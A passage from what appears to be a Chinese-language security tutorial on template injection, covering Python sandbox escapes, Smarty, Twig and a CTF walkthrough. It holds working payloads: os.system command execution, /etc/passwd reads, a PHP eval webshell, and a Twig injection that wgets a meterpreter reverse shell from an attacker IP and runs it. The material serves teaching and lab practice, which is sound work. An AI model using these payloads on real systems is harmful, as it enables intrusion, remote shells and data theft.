(60, &lt;class 'warnings.catch_warnings'&gt;, 'linecache', ['os', 'sys', '__builtins__'])   
(60, &lt;class 'warnings.catch_warnings'&gt;, 'types', ['__builtins__'])                    
(72, &lt;class 'site._Printer'&gt;, 'traceback', ['sys', '__builtins__'])                   
(72, &lt;class 'site._Printer'&gt;, 'os', ['sys', '__builtins__', 'open'])                  
(77, &lt;class 'site.Quitter'&gt;, 'traceback', ['sys', '__builtins__'])                    
(77, &lt;class 'site.Quitter'&gt;, 'os', ['sys', '__builtins__', 'open'])                   
(78, &lt;class 'codecs.IncrementalEncoder'&gt;, 'open', None)                               
(79, &lt;class 'codecs.IncrementalDecoder'&gt;, 'open', None)                               
----------3-----------                                                                
(59, 13, &lt;class 'warnings.WarningMessage'&gt;, 'file')                                   
(59, 13, &lt;class 'warnings.WarningMessage'&gt;, 'eval')                                   
(59, 13, &lt;class 'warnings.WarningMessage'&gt;, 'open')                                   
(59, 13, &lt;class 'warnings.WarningMessage'&gt;, 'execfile')                               
(60, 13, &lt;class 'warnings.catch_warnings'&gt;, 'file')                                   
(60, 13, &lt;class 'warnings.catch_warnings'&gt;, 'eval')                                   
(60, 13, &lt;class 'warnings.catch_warnings'&gt;, 'open')                                   
(60, 13, &lt;class 'warnings.catch_warnings'&gt;, 'execfile')                               
(61, 1, &lt;class '_weakrefset._IterationGuard'&gt;, 'file')                                
(61, 1, &lt;class '_weakrefset._IterationGuard'&gt;, 'eval')                                
(61, 1, &lt;class '_weakrefset._IterationGuard'&gt;, 'open')                                
(61, 1, &lt;class '_weakrefset._IterationGuard'&gt;, 'execfile')                            
(62, 1, &lt;class '_weakrefset.WeakSet'&gt;, 'file')                                        
(62, 1, &lt;class '_weakrefset.WeakSet'&gt;, 'eval')                                        
(62, 1, &lt;class '_weakrefset.WeakSet'&gt;, 'open')                                        
(62, 1, &lt;class '_weakrefset.WeakSet'&gt;, 'execfile')                                    
(72, 20, &lt;class 'site._Printer'&gt;, 'file')                                             
(72, 20, &lt;class 'site._Printer'&gt;, 'exec')                                             
(72, 23, &lt;class 'site._Printer'&gt;, 'file')                                             
(72, 23, &lt;class 'site._Printer'&gt;, 'eval')                                             
(72, 23, &lt;class 'site._Printer'&gt;, 'open')                                             
(72, 23, &lt;class 'site._Printer'&gt;, 'execfile')                                         
(77, 20, &lt;class 'site.Quitter'&gt;, 'file')                                              
(77, 20, &lt;class 'site.Quitter'&gt;, 'exec')                                              
(77, 23, &lt;class 'site.Quitter'&gt;, 'file')                                              
(77, 23, &lt;class 'site.Quitter'&gt;, 'eval')                                              
(77, 23, &lt;class 'site.Quitter'&gt;, 'open')                                              
(77, 23, &lt;class 'site.Quitter'&gt;, 'execfile')                                          
(78, 21, &lt;class 'codecs.IncrementalEncoder'&gt;, 'open')                                 
(78, 23, &lt;class 'codecs.IncrementalEncoder'&gt;, 'file')                                 
(78, 23, &lt;class 'codecs.IncrementalEncoder'&gt;, 'eval')                                 
(78, 23, &lt;class 'codecs.IncrementalEncoder'&gt;, 'open')                                 
(78, 23, &lt;class 'codecs.IncrementalEncoder'&gt;, 'execfile')                             
(79, 21, &lt;class 'codecs.IncrementalDecoder'&gt;, 'open')                                 
(79, 23, &lt;class 'codecs.IncrementalDecoder'&gt;, 'file')                                 
(79, 23, &lt;class 'codecs.IncrementalDecoder'&gt;, 'eval')                                 
(79, 23, &lt;class 'codecs.IncrementalDecoder'&gt;, 'open')                                 
(79, 23, &lt;class 'codecs.IncrementalDecoder'&gt;, 'execfile')                             
----------4-----------                                                                
(60, 'file')                                                                          
(60, 'repr')                                                                          
(60, 'eval')                                                                          
(60, 'open')                                                                          
(60, 'execfile')</code></pre>
<p>选取其中一个执行命令，<code>__mro__</code>输出父类，最后一个父类为object</p>
<pre><code class="hljs plaintext">&gt;&gt;&gt; ().__class__.__mro__[-1].__subclasses__()[72]
&lt;class 'site._Printer'&gt;

&gt;&gt;&gt; ().__class__.__mro__[-1].__subclasses__()[72].__init__.__globals__['os'].system('whoami')
misaki\user</code></pre>
<p>读取文件</p>
<pre><code class="hljs plaintext">&gt;&gt;&gt; ().__class__.__mro__[-1].__subclasses__()[72].__init__.__globals__['__builtins__']['file']("C:\\windows\\win.ini").read()'; for 16-bit app support\n[fonts]\n[extensions]\n[mciextensions]\n[files]\n[Mail]\nMAPI=1\nCMCDLLNAME32=mapi32.dll\nCMC=1\nMAPIX=1\nMAPIXVER=1.0.0.1\nOLEMessagin</code></pre>
<p>其中还可以执行的模块还有很多，比如使用含有<code>__builtins__</code>的其他模块，来调用加载的os等。</p>
<p>筛选代码来源：<a target="_blank" rel="noopener" href="https://hatboy.github.io/2018/04/19/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E6%80%BB%E7%BB%93/#%E9%81%8D%E5%8E%86%E6%89%BE%E5%88%B0%E5%85%B6%E4%BB%96%E7%9A%84%E9%80%83%E9%80%B8%E6%96%B9%E6%B3%95">Python沙箱逃逸总结</a></p>
<p>参考：<a target="_blank" rel="noopener" href="https://misakikata.github.io/2020/04/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E4%B8%8ESSTI/#python2">https://misakikata.github.io/2020/04/python-沙箱逃逸与SSTI/#python2</a></p>
<h2 id="五-php-smarty模板">五、PHP-smarty模板</h2>
<p>Smarty是最流行的PHP模板语言之一，为不受信任的模板执行提供了安全模式。这会强制执行在 php 安全函数白名单中的函数，因此我们在模板中无法直接调用 php 中直接执行命令的函数(相当于存在了一个disable_function)</p>
<p>但是，实际上对语言的限制并不能影响我们执行命令，因为我们首先考虑的应该是模板本身，恰好 Smarty 很照顾我们，在阅读<a target="_blank" rel="noopener" href="https://github.com/smarty-php/smarty">模板的文档</a>以后我们发现：$smarty内置变量可用于访问各种环境变量，比如我们使用 self 得到 smarty 这个类以后我们就去找 smarty 给我们的的方法</p>
<p>smarty/libs/sysplugins/smarty_internal_data.php　　——&gt;　　getStreamVariable() 这个方法可以获取传入变量的流</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230623183303993.png" alt="image-20230623183303993"></p>
<p>这个函数流程大致为：打开你输入的文件$variable，判断文件名是否存在，存在的话在循环中读取到文件全部内容，赋值给变量result，如果不存在则看变量smarty，抛出不同问题，分别为，文件不存在或者文件内容为空</p>
<p>因此我们可以用这个方法读文件，payload:</p>
<pre><code class="hljs plaintext">{self::getStreamVariable("file:///etc/passwd")}</code></pre>
<p>同样</p>
<p>smarty/libs/sysplugins/smarty_internal_write_file.php　　——&gt;　　Smarty_Internal_Write_File 这个类中有一个writeFile方法</p>
<pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Smarty_Internal_Write_File</span></span>
<span class="hljs-class"></span>{
    <span class="hljs-comment">/**</span>
<span class="hljs-comment">     * Writes file in a safe way to disk</span>
<span class="hljs-comment">     *</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@param</span>  string $_filepath complete filepath</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@param</span>  string $_contents file content</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@param</span>  Smarty $smarty    smarty instance</span>
<span class="hljs-comment">     *</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> SmartyException</span>
<span class="hljs-comment">     * <span class="hljs-doctag">@return</span> boolean true</span>
<span class="hljs-comment">     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">writeFile</span>(<span class="hljs-params"><span class="hljs-variable">$_filepath</span>, <span class="hljs-variable">$_contents</span>, Smarty <span class="hljs-variable">$smarty</span></span>)</span>
<span class="hljs-function">    </span>{
        <span class="hljs-variable">$_error_reporting</span> = <span class="hljs-title function_ invoke__">error_reporting</span>();
        <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-variable">$_error_reporting</span> &amp; ~E_NOTICE &amp; ~E_WARNING);
        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$smarty</span>-&gt;_file_perms !== <span class="hljs-literal">null</span>) {
            <span class="hljs-variable">$old_umask</span> = <span class="hljs-title function_ invoke__">umask</span>(<span class="hljs-number">0</span>);
        }

        <span class="hljs-variable">$_dirpath</span> = <span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-variable">$_filepath</span>);
        <span class="hljs-comment">// if subdirs, create dir structure</span>
        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_dirpath</span> !== <span class="hljs-string">'.'</span> &amp;&amp; !<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$_dirpath</span>)) {
            <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$_dirpath</span>, <span class="hljs-variable">$smarty</span>-&gt;_dir_perms === <span class="hljs-literal">null</span> ? <span class="hljs-number">0777</span> : <span class="hljs-variable">$smarty</span>-&gt;_dir_perms, <span class="hljs-literal">true</span>);
        }

        <span class="hljs-comment">// write to tmp file, then move to overt file lock race condition</span>
        <span class="hljs-variable">$_tmp_file</span> = <span class="hljs-variable">$_dirpath</span> . DS . <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">'.'</span>, <span class="hljs-string">','</span>), <span class="hljs-string">'_'</span>, <span class="hljs-title function_ invoke__">uniqid</span>(<span class="hljs-string">'wrt'</span>, <span class="hljs-literal">true</span>));
        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$_tmp_file</span>, <span class="hljs-variable">$_contents</span>)) {
            <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-variable">$_error_reporting</span>);
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SmartyException</span>(<span class="hljs-string">"unable to write file <span class="hljs-subst">{$_tmp_file}</span>"</span>);
       }

        <span class="hljs-comment">/*</span>
<span class="hljs-comment">         * Windows' rename() fails if the destination exists,</span>
<span class="hljs-comment">         * Linux' rename() properly handles the overwrite.</span>
<span class="hljs-comment">         * Simply unlink()ing a file might cause other processes</span>
<span class="hljs-comment">         * currently reading that file to fail, but linux' rename()</span>
<span class="hljs-comment">         * seems to be smart enough to handle that for us.</span>
<span class="hljs-comment">         */</span>
        <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Smarty</span>::<span class="hljs-variable">$_IS_WINDOWS</span>) {
            <span class="hljs-comment">// remove original file</span>
            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_file</span>(<span class="hljs-variable">$_filepath</span>)) {
                @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$_filepath</span>);
            }
            <span class="hljs-comment">// rename tmp file</span>
            <span class="hljs-variable">$success</span> = @<span class="hljs-title function_ invoke__">rename</span>(<span class="hljs-variable">$_tmp_file</span>, <span class="hljs-variable">$_filepath</span>);
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-comment">// rename tmp file</span>
            <span class="hljs-variable">$success</span> = @<span class="hljs-title function_ invoke__">rename</span>(<span class="hljs-variable">$_tmp_file</span>, <span class="hljs-variable">$_filepath</span>);
            <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$success</span>) {
                <span class="hljs-comment">// remove original file</span>
                <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_file</span>(<span class="hljs-variable">$_filepath</span>)) {
                    @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$_filepath</span>);
                }
                <span class="hljs-comment">// rename tmp file</span>
                <span class="hljs-variable">$success</span> = @<span class="hljs-title function_ invoke__">rename</span>(<span class="hljs-variable">$_tmp_file</span>, <span class="hljs-variable">$_filepath</span>);
            }
        }
        <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$success</span>) {
            <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-variable">$_error_reporting</span>);
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SmartyException</span>(<span class="hljs-string">"unable to write file <span class="hljs-subst">{$_filepath}</span>"</span>);
        }
        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$smarty</span>-&gt;_file_perms !== <span class="hljs-literal">null</span>) {
            <span class="hljs-comment">// set file permissions</span>
            <span class="hljs-title function_ invoke__">chmod</span>(<span class="hljs-variable">$_filepath</span>, <span class="hljs-variable">$smarty</span>-&gt;_file_perms);
            <span class="hljs-title function_ invoke__">umask</span>(<span class="hljs-variable">$old_umask</span>);
        }
        <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-variable">$_error_reporting</span>);

        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    }
}</code></pre>
<p>可以看到 writeFile 函数第三个参数一个 Smarty 类型，后来找到了 self::clearConfig()，函数原型：</p>
<pre><code class="hljs plaintext">public function clearConfig($varname = null)
{
    return Smarty_Internal_Extension_Config::clearConfig($this, $varname);
}</code></pre>
<p>因此我们可以构造payload写个webshell:</p>
<pre><code class="hljs plaintext">{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"&lt;?php eval($_GET['cmd']); ?&gt;",self::clearConfig())}</code></pre>
<p>CTF地址：<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges%EF%BC%88CISCN2019%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BAWeb11%EF%BC%89">https://buuoj.cn/challenges（CISCN2019华东南赛区Web11）</a></p>
<p>题目模拟了一个获取IP的API，并且可以在最下方看到 “Build With Smarty !” 可以确定页面使用的是Smarty模板引擎。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230623185049916.png" alt="image-20230623185049916"></p>
<p>在页面的右上角发现了IP，但是题目中显示的API的URL由于环境的原因无法使用，猜测这个IP受X-Forwarded-For头控制。</p>
<p>将XFF头改为 {6*7} 会发现该位置的值变为了42，便可以确定这里存在SSTI。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230623185133934.png" alt="image-20230623185133934"></p>
<p>直接构造 {system(‘cat /flag’)} 即可得到flag</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230623185149818.png" alt="image-20230623185149818"></p>
<h3 id="1-smarty-ssti常规利用方式">1. Smarty-SSTI常规利用方式</h3>
<pre><code class="hljs plaintext">**1. {$smarty.version}**

{$smarty.version}  #获取smarty的版本号</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230623185401662.png" alt="image-20230623185401662"></p>
<pre><code class="hljs plaintext">2. {php}{/php}

{php}phpinfo();{/php}  #执行相应的php代码</code></pre>
<p>Smarty支持使用 {php}{/php} 标签来执行被包裹其中的php指令，最常规的思路自然是先测试该标签。但就该题目而言，使用{php}{/php}标签会报错：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230623185441046.png" alt="image-20230623185441046"></p>
<p>因为在Smarty3版本中已经废弃{php}标签，强烈建议不要使用。在Smarty 3.1，{php}仅在SmartyBC中可用。</p>
<pre><code class="hljs plaintext">**3. {literal}**

&lt;script language="php"&gt;phpinfo();&lt;/script&gt;</code></pre>
<p>这个地方借助了 {literal} 这个标签，因为 {literal} 可以让一个模板区域的字符原样输出。 这经常用于保护页面上的Javascript或css样式表，避免因为Smarty的定界符而错被解析。但是这种写法只适用于php5环境，这道ctf使用的是php7，所以依然失败</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230623185557407.png" alt="image-20230623185557407"></p>
<p><strong>4.</strong> <strong>getstreamvariable</strong></p>
<pre><code class="hljs plaintext">{self::getStreamVariable("file:///etc/passwd")}</code></pre>
<p>Smarty类的getStreamVariable方法的代码如下：</p>
<pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getStreamVariable</span>(<span class="hljs-params"><span class="hljs-variable">$variable</span></span>)</span>
<span class="hljs-function"></span>{
        <span class="hljs-variable">$_result</span> = <span class="hljs-string">''</span>;
        <span class="hljs-variable">$fp</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-variable">$variable</span>, <span class="hljs-string">'r+'</span>);
        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$fp</span>) {
            <span class="hljs-keyword">while</span> (!<span class="hljs-title function_ invoke__">feof</span>(<span class="hljs-variable">$fp</span>) &amp;&amp; (<span class="hljs-variable">$current_line</span> = <span class="hljs-title function_ invoke__">fgets</span>(<span class="hljs-variable">$fp</span>)) !== <span class="hljs-literal">false</span>) {
                <span class="hljs-variable">$_result</span> .= <span class="hljs-variable">$current_line</span>;
            }
            <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$fp</span>);
            <span class="hljs-keyword">return</span> <span class="hljs-variable">$_result</span>;
        }
        <span class="hljs-variable">$smarty</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;smarty) ? <span class="hljs-variable language_">$this</span>-&gt;smarty : <span class="hljs-variable language_">$this</span>;
        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$smarty</span>-&gt;error_unassigned) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SmartyException</span>(<span class="hljs-string">'Undefined stream variable "'</span> . <span class="hljs-variable">$variable</span> . <span class="hljs-string">'"'</span>);
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
        }
    }</code></pre>
<p>可以看到这个方法可以读取一个文件并返回其内容，所以我们可以用self来获取Smarty对象并调用这个方法。然而使用这个payload会触发报错如下：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230623185656151.png" alt="image-20230623185656151"></p>
<p>可见这个旧版本Smarty的SSTI利用方式并不适用于新版本的Smarty。而且在3.1.30的Smarty版本中官方已经把该静态方法删除。 对于那些文章提到的利用 Smarty_Internal_Write_File 类的writeFile方法来写shell也由于同样的原因无法使用。</p>
<pre><code class="hljs plaintext">**5. {if}{/if}**

{if phpinfo()}{/if}

Smarty的 {if} 条件判断和PHP的if非常相似，只是增加了一些特性。每个{if}必须有一个配对的{/if}，也可以使用{else} 和 {elseif}，全部的PHP条件表达式和函数都可以在if内使用，如||*，or，&amp;&amp;，and，is_array()等等，如：{if is_array($array)}{/if}*

既然这样就将XFF头改为 {if phpinfo()}{/if} ：</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230623185829356.png" alt="image-20230623185829356"></p>
<p>同样还能用来执行一些系统命令：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230623185839848.png" alt="image-20230623185839848"></p>
<h3 id="2-ctf漏洞成因">2. CTF漏洞成因</h3>
<p>本题中引发SSTI的代码简化后如下：</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
    <span class="hljs-keyword">require_once</span>(<span class="hljs-string">'./smarty/libs/'</span> . <span class="hljs-string">'Smarty.class.php'</span>);
    <span class="hljs-variable">$smarty</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Smarty</span>();
    <span class="hljs-variable">$ip</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">'HTTP_X_FORWARDED_FOR'</span>];
    <span class="hljs-variable">$smarty</span>-&gt;<span class="hljs-title function_ invoke__">display</span>(<span class="hljs-string">"string:"</span>.<span class="hljs-variable">$ip</span>);     <span class="hljs-comment">// display函数把标签替换成对象的php变量；显示模板</span>
}</code></pre>
<p>可以看到这里使用字符串代替smarty模板，导致了注入的Smarty标签被直接解析执行，产生了SSTI。</p>
<h3 id="3-php的模板注入">3. PHP的模板注入</h3>
<p>如果是在cookie处执行，最好抓包打payload，可能有url编码的问题</p>
<h2 id="六-php-blade模板">六、PHP-Blade模板</h2>
<p>Blade 是 Laravel 提供的一个既简单又强大的模板引擎。</p>
<p>关于blade模板这里不再多说，请参考《<a target="_blank" rel="noopener" href="https://www.cnblogs.com/sgm4231/p/10283661.html">laravel Blade 模板引擎</a>》</p>
<p>遇到在学吧…</p>
<h2 id="七-php-twig引擎">七、PHP-Twig引擎</h2>
<p>Twig是来自于Symfony的模板引擎，它非常易于安装和使用。它的操作有点像Mustache和liquid。</p>
<p>eg：</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
　　<span class="hljs-keyword">require_once</span> <span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-keyword">__FILE__</span>).<span class="hljs-string">'\twig\lib\Twig\Autoloader.php'</span>;
　　<span class="hljs-title class_">Twig_Autoloader</span>::<span class="hljs-title function_ invoke__">register</span>(<span class="hljs-literal">true</span>);
　　<span class="hljs-variable">$twig</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Twig_Environment</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Twig_Loader_String</span>());
　　<span class="hljs-variable">$output</span> = <span class="hljs-variable">$twig</span>-&gt;<span class="hljs-title function_ invoke__">render</span>(<span class="hljs-string">"Hello {{name}}"</span>, <span class="hljs-keyword">array</span>(<span class="hljs-string">"name"</span> =&gt; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">"name"</span>]));  <span class="hljs-comment">// 将用户输入作为模版变量的值</span>
　　<span class="hljs-keyword">echo</span> <span class="hljs-variable">$output</span>;
<span class="hljs-meta">?&gt;</span></code></pre>
<pre><code class="hljs plaintext">Twig使用一个加载器 loader(Twig_Loader_Array) 来定位模板，以及一个环境变量 environment(Twig_Environment) 来存储配置信息。

其中，render() 方法通过其第一个参数载入模板，并通过第二个参数中的变量来渲染模板。

使用 Twig 模版引擎渲染页面，其中模版含有 {{name}} 变量，其模版变量值来自于GET请求参数$_GET["name"] 。</code></pre>
<p>显然这段代码并没有什么问题，即使你想通过name参数传递一段JavaScript代码给服务端进行渲染，也许你会认为这里可以进行 XSS，但是由于模版引擎一般都默认对渲染的变量值进行编码和转义，所以并不会造成跨站脚本攻击:</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230622220034048.png" alt="image-20230622220034048"></p>
<p>但是,如果渲染的模版内容受到用户的控制,情况就不一样了。修改代码为:</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
　　<span class="hljs-keyword">require_once</span> <span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-keyword">__FILE__</span>).<span class="hljs-string">'/../lib/Twig/Autoloader.php'</span>;
　　<span class="hljs-title class_">Twig_Autoloader</span>::<span class="hljs-title function_ invoke__">register</span>(<span class="hljs-literal">true</span>);
　　<span class="hljs-variable">$twig</span>=<span class="hljs-title function_ invoke__">newTwig_Environment</span>(<span class="hljs-title function_ invoke__">newTwig_Loader_String</span>());
　　<span class="hljs-variable">$output</span>=<span class="hljs-variable">$twig</span>-&gt;<span class="hljs-title function_ invoke__">render</span>(<span class="hljs-string">"Hello <span class="hljs-subst">{$_GET['name']}</span>"</span>);<span class="hljs-comment">// 将用户输入作为模版内容的一部分</span>
　　<span class="hljs-keyword">echo</span> <span class="hljs-variable">$output</span>;
<span class="hljs-meta">?&gt;</span></code></pre>
<p>上面这段代码在构建模版时，拼接了用户输入作为模板的内容，现在如果再向服务端直接传递 JavaScript 代码，用户输入会原样输出，测试结果显而易见:</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230622220108419.png" alt="image-20230622220108419"></p>
<pre><code class="hljs plaintext">如果服务端将用户的输入作为了模板的一部分，那么在页面渲染时也必定会将用户输入的内容进行模版编译和解析最后输出。

在Twig模板引擎里,，{{var}} 除了可以输出传递的变量以外，还能执行一些基本的表达式然后将其结果作为该模板变量的值。

例如这里用户输入name={{2*10}} ，则在服务端拼接的模版内容为:</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230623180615856.png" alt="image-20230623180615856"></p>
<p>尝试插入一些正常字符和 Twig 模板引擎默认的注释符，构造 Payload 为:</p>
<pre><code class="hljs plaintext">bmjoker{# comment #}{{2*8}}OK</code></pre>
<p>实际服务端要进行编译的模板就被构造为:</p>
<pre><code class="hljs plaintext">bmjoker{# comment #}{{2*8}}OK</code></pre>
<pre><code class="hljs plaintext">由于 {# comment #} 作为 Twig 模板引擎的默认注释形式，所以在前端输出的时候并不会显示，而 {{2*8}} 作为模板变量最终会返回16 作为其值进行显示，因此前端最终会返回内容 Hello bmjoker16OK</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230623180803003.png" alt="image-20230623180803003"></p>
<p>通过上面两个简单的示例,就能得到 SSTI 扫描检测的大致流程(这里以 Twig 为例):</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230623181011667.png" alt="image-20230623181011667"></p>
<p>同常规的 SQL 注入检测，XSS 检测一样，模板注入漏洞的检测也是向传递的参数中承载特定 Payload 并根据返回的内容来进行判断的。</p>
<p>每一个模板引擎都有着自己的语法，Payload 的构造需要针对各类模板引擎制定其不同的扫描规则，就如同 SQL 注入中有着不同的数据库类型一样。</p>
<p>简单来说，就是更改请求参数使之承载含有模板引擎语法的 Payload，通过页面渲染返回的内容检测承载的 Payload 是否有得到编译解析，有解析则可以判定含有 Payload 对应模板引擎注入，否则不存在 SSTI。</p>
<p>凡是使用模板的网站，基本都会存在SSTI，只是能否控制其传参而已。</p>
<p>接下来借助XVWA的代码来实践演示一下SSTI注入</p>
<p>如果在web页面的源代码中看到了诸如以下的字符，就可以推断网站使用了某些模板引擎来呈现数据</p>
<pre><code class="hljs plaintext">&lt;div&gt;{$what}&lt;/div&gt;
&lt;p&gt;Welcome, {{username}}&lt;/p&gt;
&lt;div&gt;{%$a%}&lt;/div&gt;
...</code></pre>
<p>通过注入了探测字符串 $579，以查看应用程序是否进行了相应的计算：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230623182009044.png" alt="image-20230623182009044"></p>
<pre><code class="hljs plaintext">根据这个响应，我们可以推测这里使用了模板引擎，因为这符合它们对于 {{ }} 的处理方式</code></pre>
<p>在这里提供一个针对twig的攻击载荷：</p>
<pre><code class="hljs plaintext">{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230623182109299.png" alt="image-20230623182109299"></p>
<p>使用msf生成了一个php meterpreter有效载荷</p>
<pre><code class="hljs plaintext">msfvenom -p php/meterpreter/reverse_tcp -f raw LHOST=192.168.127.131 LPORT=4321 &gt; /var/www/html/shell.txt</code></pre>
<p>msf进行监听：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230623182457734.png" alt="image-20230623182457734"></p>
<p>模板注入远程下载shell，并重命名运行</p>
<pre><code class="hljs plaintext">{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("wget http://192.168.127.131/shell.txt -O /tmp/shell.php;php -f /tmp/shell.php")}}</code></pre>
